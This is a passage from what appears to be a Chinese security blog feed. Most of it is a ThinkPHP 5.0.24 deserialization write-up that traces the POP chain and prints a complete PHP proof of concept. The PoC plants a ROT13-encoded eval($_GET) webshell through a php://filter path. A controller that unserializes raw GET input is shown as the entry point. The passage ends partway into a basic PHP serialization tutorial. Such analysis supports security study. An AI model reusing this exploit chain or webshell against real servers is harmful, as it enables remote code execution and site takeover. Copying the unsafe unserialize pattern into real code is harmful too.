loading="lazy"></p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h4><p>不同版本生成的exp不同，如下是影响版本：</p><pre><code>5.1.3 &lt; tp &lt; 5.1.37</code></pre><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x反序列化" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x反序列化</a></p><p>2.<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md</a></p><p>3.<a href="https://paper.seebug.org/1040/" target="_blank" rel="noopener">https://paper.seebug.org/1040/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;&lt;strong&gt;环境搭建&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;利用composer下载tp5.1.37的环境&lt;/p&gt;
&lt;pre class=&quot; lang
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.0.24反序列化漏洞分析</title>
    <link href="http://yoursite.com/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-05-06T16:00:00.000Z</published>
    <updated>2020-05-07T07:34:44.194Z</updated>
    
    <content type="html"><![CDATA[<p>这个洞的利用需要利用tp进行二次开发，当unserialize的参数可控，既可触发这个洞。在index控制器中写入：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">'Welcome to ThinkPHP!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="POP链构造分析"><a href="#POP链构造分析" class="headerlink" title="POP链构造分析"></a><strong>POP链构造分析</strong></h4><p>首先，进行全局搜索__destruct，查看thinkphp/library/think/process/pipes/Windows.php的Windows类中调用了__destruct魔术方法。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进removeFiles，发现file__exists函数，file__exists处理的时候会将当作字符串来处理，所以可以调用__toString，全局搜索__toString。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进toJson</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">toJson</span><span class="token punctuation">(</span><span class="token variable">$options</span> <span class="token operator">=</span> <span class="token constant">JSON_UNESCAPED_UNICODE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进toArray方法，这里发现三处可以触发__call方法。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/1.png" alt="" loading="lazy"></p><p>经过分析最后一处的参数可控，可以调用__call方法，要执行到这里，要满足如下条件：</p><p>$this-&gt;append可控且为数组，进入下面关键两行代码。</p><pre class=" language-php"><code class="language-php"><span class="token variable">$modelRelation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$relation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getRelationData</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$relation由$this-&gt;append控制，这里需要找个可控的点，在Model方法中getError方法可控</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进getRelationData方法，要满足if语句的条件就可以让value可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/2.png" alt="" loading="lazy"></p><p>通过全局搜索isSelfRelation，发现isSelfRelation方法是类Relation，而HasOne，OneToOne是Relation的子类，所以$modelRelation可以实例化HasOne类，继续都下面的代码，要满足：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">,</span> <span class="token string">'getBindAttr'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>全局搜索getBindAttr，发现OneToOne中存在此方法，发现bindAttr可控</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBindAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>最后value可控，执行<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>就可以调用到__call方法，全局查看__call，漏洞触发点在thinkphp/library/think/console/Output.php</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/3.png" alt="" loading="lazy"></p><p>跟进搜索block方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">block</span><span class="token punctuation">(</span><span class="token variable">$style</span><span class="token punctuation">,</span> <span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeln</span><span class="token punctuation">(</span><span class="token string">"&lt;{$style}>{$message}&lt;/$style>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进writeln，在跟进write</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/4.png" alt="" loading="lazy"></p><p>这里发现$this-&gt;handle可控，可以进行全局搜索wirte方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/5.png" alt="" loading="lazy"></p><p>找到thinkphp/library/think/session/driver/Memcached.php文件中存在write方法，且$this-&gt;handle可控，继续全局查找set方法，在文件thinkphp/library/think/cache/driver/File.php发现存在写入文件。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/6.png" alt="" loading="lazy"></p><p>这里跟进getCacheKey方法，查看filename是否可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/7.png" alt="" loading="lazy"></p><p>这里$this-&gt;options可控，目前filename可控了，现在就只需要写入的data可控了，跟进setTagItem方法看一下，发现又执行了一次set。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/8.png" alt="" loading="lazy"></p><p>发现value的值就为传进来的filename。最后，整个的pop链就分析完了，贴上<a href="https://www.anquanke.com/post/id/196364#h2-0" target="_blank" rel="noopener">安全客的一篇文章</a></p><p>的pop链图。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/9.png" alt="" loading="lazy"></p><p>最后，poc如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//触发Model __toString(),子类Pivot合适</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Relation</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#class Query</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token shell-comment comment">#OneToOne HasOne</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Relation</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">OneToOne</span> <span class="token keyword">extends</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">HasOne</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"no"</span><span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Output</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Output</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcached</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//目的调用其write()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Model</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$parent</span><span class="token punctuation">;</span><span class="token shell-comment comment">#修改处</span>    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$aaaaa</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Output对象,目的是调用__call()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getError'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HasOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Relation子类,且有getBindAttr()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//isSelfRelation()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Query</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Query</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Memcached</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcached</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//目的调用File->set()</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token shell-comment comment">#File</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">'expire'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token string">'cache_subdir'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token string">'prefix'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>            <span class="token string">'path'</span>          <span class="token operator">=</span><span class="token operator">></span> 'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?>',</span>            <span class="token string">'data_compress'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>poc只能对linux，windows限制了文件名，最后，文件的命名规则如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>cuc <span class="token function">cucvasb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">riny</span><span class="token punctuation">(</span><span class="token variable">$_TRG</span><span class="token punctuation">[</span>pzq<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span class="token operator">+</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'tag_'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/10.png" alt="" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p><a href="https://www.anquanke.com/post/id/196364#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364#h2-0</a></p><p><a href="http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个洞的利用需要利用tp进行二次开发，当unserialize的参数可控，既可触发这个洞。在index控制器中写入：&lt;/p&gt;
&lt;pre class=&quot; language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token d
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化到pop链构造</title>
    <link href="http://yoursite.com/2020/04/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pop%E9%93%BE%E6%9E%84%E9%80%A0/"/>
    <id>http://yoursite.com/2020/04/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pop%E9%93%BE%E6%9E%84%E9%80%A0/</id>
    <published>2020-04-25T16:00:00.000Z</published>
    <updated>2020-04-29T06:53:41.508Z</updated>
    
    <content type="html"><![CDATA[<h4 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a><strong>序列化与反序列化</strong></h4><p>在php中，使用serialize和unserialize两个函数表示序列化与反序列化。</p><pre><code>serialize：把一个对象转化成字节流的字符串，序列化的对象会保存类的属性，不会保存方法unserialize：把字节流字符串转化成一个对象</code></pre><p>看下下面的列子，通过serialize序列化返回字符串</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 属性</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 方法</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"My name is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">.</span><span class="token string">",I am is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">.</span><span class="token string">" years old!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token string">'fanxing'</span><span class="token punctuation">,</span><span class="token string">'20'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>返回字节流的字符串</p><pre><code>O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:7:&quot;fanxing&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;}</code></pre><p>O代表对象:长度:类的名字:类的属性个数:{类型:长度:属性名字;类型:长度:属性值;…}</p><p>反序列化列子如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 属性</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 方法</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Skill</span><span class="token 